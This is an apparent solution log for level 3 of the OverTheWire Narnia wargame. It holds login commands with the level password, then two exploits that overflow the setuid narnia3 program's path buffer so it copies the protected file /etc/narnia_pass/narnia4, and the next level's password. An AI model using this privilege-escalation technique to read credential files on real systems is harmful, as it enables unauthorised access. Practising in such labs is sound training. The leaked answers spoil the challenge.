sftp -oPort=2226 narnia3@narnia.labs.overthewire.org
2xszzNl6uG
get /narnia/narnia3
get /narnia/narnia3.c
exit

sshpass -p '2xszzNl6uG' ssh narnia3@narnia.labs.overthewire.org -p 2226
cd /narnia

ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/password
./narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/password
cat /tmp/password
# Password: iqNWNk173q


cd /tmp
mkdir narnia_pass
touch narnia_pass/narnia4
/narnia/narnia3 ////////////////////////////etc/narnia_pass/narnia4
cat narnia_pass/narnia4
# Password: iqNWNk173q